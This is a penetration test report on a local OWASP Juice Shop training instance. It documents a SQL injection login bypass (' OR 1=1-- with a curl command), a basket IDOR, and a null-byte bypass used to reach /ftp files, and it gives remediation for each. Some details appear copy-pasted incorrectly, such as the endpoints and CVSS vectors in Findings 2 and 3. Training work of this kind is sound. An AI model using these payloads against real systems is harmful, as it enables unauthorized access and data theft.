# Juice Shop Penetration Test Report
**Tester:** Victor Oduor  
**Date:** 2026-06-17  
**Target:** OWASP Juice Shop - v19.3.1 @ http://localhost:3000 (local Docker)  
**Scope:** Local instance only. Out of scope: host OS, Docker daemon, DoS testing.

## Executive Summary
These are the findings from the penetration test of OWASP Juice Shop - v19.3.1 @ http://localhost:3000 (local Docker) that was conducted between 2026-06-17 and 2026-06-17. The target of the penetration test was OWASP Juice Shop - v19.3.1 @ http://localhost:3000 (local Docker). The scope of the penetration test was limited to the OWASP Juice Shop - v19.3.1 @ http://localhost:3000 (local Docker). Out of scope: host OS, Docker daemon, DoS testing. These findings are based on the OWASP Top 10 2025 vulnerability categories. The findings are ordered from most critical to least critical.

---
## Findings Summary Table
| # | Finding | Severity | CVSS |
|---|---------|----------|------|
| 1 | SQLi in login | Critical | 9.8 |
| 2 | IDOR on basket | High | 7.5 |
| 3 | Sensitive files via /ftp | High | 7.5 |

## Attack Chain Narrative
Unauthenticated attacker manages to gain admin access through SQL injection attack on the login endpoint. the admin can access other users' baskets and steal their personal information. The attacker can also access sensitive files in the /ftp directory.

---


## Finding 1 — A03 — SQL Injection in Login Endpoint
**Severity:** Critical  
**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**OWASP:** A03:2021 Injection  
**Endpoint:** POST /rest/user/login

### Reproduction
1. Navigate to http://localhost:3000/#/login
2. Enter email: `' OR 1=1--` (trailing space)
3. Enter password: anything
4. Click Log in

```bash
curl -X POST http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1-- ","password":"x"}'
```

### Evidence
![admin login](./screenshots/Screenshot_2026-06-17_09_49_53.png)
*Figure 1: Application returns admin session token in response to malformed login.*

### Root Cause
The login handler concatenates the email field directly into a SQL string instead of using parameterized queries. The `--` sequence comments out the password check, and `OR 1=1` makes the WHERE clause true for the first user in the table (admin).

### Remediation
- Use parameterized queries / Sequelize `replacements` or `bind` — never string concatenation.
- Implement input validation on the email field (RFC 5322 regex) before it reaches the data layer.
- Add WAF rule for common SQLi tokens as defense-in-depth.

### References
- OWASP A03:2021 — Injection
- CWE-89: SQL Injection


---
## Finding Two: A01 Broken Access Control (Basket IDOR)
**Severity:** High  
**CVSS 3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**OWASP:** A01:2021 Broken Access Control  
**Endpoint:** POST /rest/user/login

### Reproduction    
1. Navigate to http://localhost
```bash
curl -k GET /rest/basket/1 HTTP/1.1
```
response after changing basket id from 1 to 2
```bash
HTTP/1.1 200 OK
"id":1,"coupon":null,"UserId":1,"createdAt":"2026-06-17T06:15:47.667Z","updatedAt":"2026-06-17T06:15:47.667Z","Products":[]}
curl -k GET /rest/basket/2 HTTP/1.1
HTTP/1.1 200 OK
"id":2,"coupon":null,"UserId":2,"createdAt":"2026-06-17T06:15:47.753Z","updatedAt":"2026-06-17T06:15:47.753Z",
``` 
evidence
![image](./screenshots/Screenshot_2026-06-17_10_23_03.png)

## Root Cause
Broken access control is a security vulnerability that occurs when an application does not properly enforce access control policies, allowing unauthorized users to access sensitive information or perform unauthorized actions. In this case, the application is using user-supplied content in a database query without properly sanitizing it, or when an application uses an insecure API.

## Remediation
1. Implement object-level authorization: Use object-level authorization to ensure that users can only access their own baskets. This can be done by adding authorization checks to the basket endpoint.
2. Implement input validation: Implement strict input validation to ensure that user input conforms to expected formats. This can help prevent the injection of malicious code.

### References
OWSP: A01:2021 — Broken Access Control
CWE-284: Improper Access Control

---

## Finding Three: A01 forced browsing to `/ftp`
**Severity:** High  
**CVSS 3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**OWASP:** A01:2021 Broken Access Control  
**Endpoint:** POST /rest/user/login

### Reproduction    
1. Navigate to http://localhost/ftp
```bash
curl -k GET /ftp HTTP/1.1
```

evidence
![image](./screenshots/Screenshot_2026-06-17_10_30_19.png)
  ```bash
  #### Reversible coupon encoding
 curl http://localhost:3000/ftp/coupons_2013.md.bak%2500.md
n<MibgC7sn
mNYS#gC7sn
o*IVigC7sn
k#pDlgC7sn
o*I]pgC7sn
n(XRvgC7sn
n(XLtgC7sn
k#*AfgC7sn
q:<IqgC7sn
pEw8ogC7sn
pes[BgC7sn
l}6D$gC7ss                 
  ```
## Root Cause
The application exposes a directory listing for `/ftp` and the coupon encoder endpoint is reversible, meaning that coupons can be decoded by anyone who has access to the encoded values.

## Remediation
1. Disable directory listing for `/ftp`
2. Do not push sensitive files to the production server
3. Do not use null bytes in file names 

### References
OWSP: A05:2021 — Security Misconfiguration  
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

---

## Recommendations (Prioritized)
1. **Immediate:** Patch SQLi (Finding 1) — blocks the whole chain.
2. **This sprint:** Add authorization checks on all `/rest/*` endpoints (Finding 2).
3. **This sprint:** Remove `/ftp` from production routing (Finding 3).

## Regulatory Context
Under Kenya's Data Protection Act 2019, the customer PII exposure (Finding 2) would constitute a personal data breach. Section 43 requires notification to the Office of the Data Protection Commissioner within 72 hours. Failure to notify carries penalties up to KES 5,000,000 or 1% of annual turnover.

## Appendix A — Tooling
Burp Suite Community 147.0.7727.101, Chromium, Docker 28.5.2+dfsg4, OWASP Juice Shop - v19.3.1 @ http://localhost:3000 (local Docker)